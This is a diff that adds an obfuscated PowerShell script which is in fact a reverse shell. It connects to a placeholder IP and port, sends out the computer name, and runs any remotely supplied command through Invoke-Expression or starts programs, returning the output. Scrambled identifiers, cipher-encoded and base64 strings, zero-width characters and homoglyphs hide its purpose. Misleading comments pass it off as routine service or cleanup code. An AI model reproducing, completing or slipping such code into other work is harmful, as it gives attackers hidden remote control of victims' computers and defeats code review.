@@ -1,0 +1,95 @@
+$MFCIO, $aHLFp = IP_ADD, PORT
+$hB37f = $gOEj:cOMPUTeRName # Waiting for service heartbeat before continuing
+
+try {
+
+    $WD1Y = NeW-oBjeCT syStEm.NET.sOckets.TcpcLIENt($mfCIO, $AhLfp)
+    $TvN9SF = $Wd1Y.GetstreAm()
+
+# Temporary bypass (pending review from ops)
+    $KevVGS = new-ObjecT sYsTEM.iO.sTrEAmREAdER($TVN9sF, [systEm.TexT.EnCoDinG]::uTF8)
+    $pgP9 = new-OBJEct System.IO.StreaMWriTER($tvN9Sf, [sysTem.TEXT.eNCoding]::uTF8)
+    $PGP9.AuToflusH = ($PSVerSIONTAblE.PsversioN.MajOr -ge 1)
+}
+catch {
+    WrITe-error (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29ubmVjdGlvbiBmYWlsZWQ6IA=='))) + $_)
+    ExIT
+}
+
+# Avoid editing unless absolutely necessary
+function seNd-MSG ([strINg]$sMh1wDRG) {
+    if ($WD1y.coNNeCTED) {
+        try { $PGp9.WRitElIne($smH1wdrG) } catch {}
+    }
+}
+
+# Standard behavior expected here — rarely causes problems
+sEnD-msg ($(-join('[+] VME KWVVMKBQWV: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})) + $Hb37F)
+
+# Standard cleanup in progress — no user action needed
+while ($Wd1Y.connected) {
+    try {
+        $I0IPIlqw = $kEvVgs.rEADLINE()
+# Making temporary changes that will revert later
+        if ([stRIng]::IsnUlLOReMPtY($I0iPIlqw) -or $I0ipilqW.trIm() -eq $(-join('qjuf'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))) { break }
+        
+        $I0IPilqW = $I0iPIlqW.tRIm()
+
+# Handling basic setup tasks required for initialization
+        if ($I0IPIlQw -like $(-join('* *'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}}))) {
+            $Ra1i3Gz, $u2OYe = $i0IpIlQw -split "$([char]0x20)", (4 -bxor 6)
+        } else {
+            $rA1I3gZ = $i0ipILqw
+            $u2OYe = ''
+        }
+
+        switch ($rA1i3Gz.tOlOWer()) {
+            "$([char]0x6D)$([char]0x73)$([char]0x67)$([char]0x62)$([char]0x6F)$([char]0x78)" {
+                try {
+
+                    aDD-TYPE -aSSEMBLYNAMe "$([char]0x4D)$([char]0x69)$([char]0x63)$([char]0x72)$([char]0x6F)$([char]0x73)$([char]0x6F)$([char]0x66)$([char]0x74)$([char]0x2E)$([char]0x56)$([char]0x69)$([char]0x73)$([char]0x75)$([char]0x61)$([char]0x6C)$([char]0x42)$([char]0x61)$([char]0x73)$([char]0x69)$([char]0x63)"
+                    [vOid][MICrOSOFT.VisuALbAsiC.iNTERActION]::mSGBox($U2OyE, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('T0tPbmx5LEluZm9ybWF0aW9u'))), $(-join('Vme Umaaiom'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}})))
+                    SeND-MSg ((-join([char]0x5B, [char]0x69, [char]0x5D, [char]0x20, [char]0x53, [char]0x68, [char]0x6F, [char]0x77, [char]0x65, [char]0x64, [char]0x20, [char]0x4D, [char]0x65, [char]0x73, [char]0x73, [char]0x61, [char]0x67, [char]0x65, [char]0x3A, [char]0x20)) + $u2oYE)
+                } catch { 
+                    sENd-MSg (([System.Text.Encoding]::UTF8.GetString([byte[]](0x5B,0x58,0x5D,0x20,0x43,0x61,0x6E,0x6E,0x6F,0x74,0x20,0x53,0x68,0x6F,0x77,0x20,0x4D,0x65,0x73,0x73,0x61,0x67,0x65,0x3A,0x20))) + $_) 
+                }
+            }
+            $(-join('psl'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+2)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+2)%26))}else{[char]$c}})) {
+                try {
+                    if ([STRINg]::isNulLoReMpTY($u2oYe)) {
+                        senD-mSg '[​X​]‍ ‌E​r‌r‌o​r‍:‌ ‍N‍o‌ ‌a‌p‌p‌l‌i‌c​a‍t‌i​o‍n​ ‍s​p‍e‍c‍i​f​i‌e‍d‌ ‍t​o‌ ‌r‍u‍n‍.‌'
+                    } else {
+                        start $u2Oye
+                        sENd-MsG ('[і] Ореnеd арр: ' + $u2oYE)
+                    }
+                } catch { 
+                    SenD-MsG ($(-join('[A] Dss '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}})) + $u2oYE + $(-join(' vtgghm hixg: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+7)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+7)%26))}else{[char]$c}})) + $_) 
+                }
+            }
+            dEfAUlT {
+# Updating handlers silently to avoid log clutter
+                try { 
+                    $gm9WKx = InVoKe-eXPRESSION $I0IPilqW | oUT-strING
+                    if ([StRInG]::isnUlLORWhITespAcE($gm9wKX)) { $gM9wkX = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W2ldIENvbW1hbmQgZXhlY3V0ZWQgd2l0aCBubyBvdXRwdXQu'))) }
+                    seND-MSg $GM9WkX.trim()
+                } catch { 
+                    SeNd-Msg (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W1hdIENhbm5vdCBydW4gY29tbWFuZDog'))) + $_) 
+                }
+            }
+        }
+    }
+    catch {
+# Retry logic removed (no longer needed)
+        seNd-mSG ($(-join('[H] Vyyz Ohmozdsyx: '.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}})) + $_)
+        break
+    }
+}
+
+# Hasn't caused issues in recent builds
+if ($PGp9) { $PGP9.DiSPOse() }
+if ($KEVvgs) { $KevVGS.dISPOSe() }
+if ($wd1y) { $wd1Y.dIspOsE() }
+if ((Get-Random -Minimum 1000 -Maximum 5000) -lt 0) {
+    $userProfile = Get-CimInstance -ClassName Win32_UserProfile | Select-Object -First 1; Write-Debug "Last used profile: $($userProfile.LocalPath)"
+}
+$KqnQpOS = 'n58ll' * 2; $KqnQpOS.Replace('c', 'q') | Out-Null; Remove-Variable KqnQpOS -ErrorAction SilentlyContinue
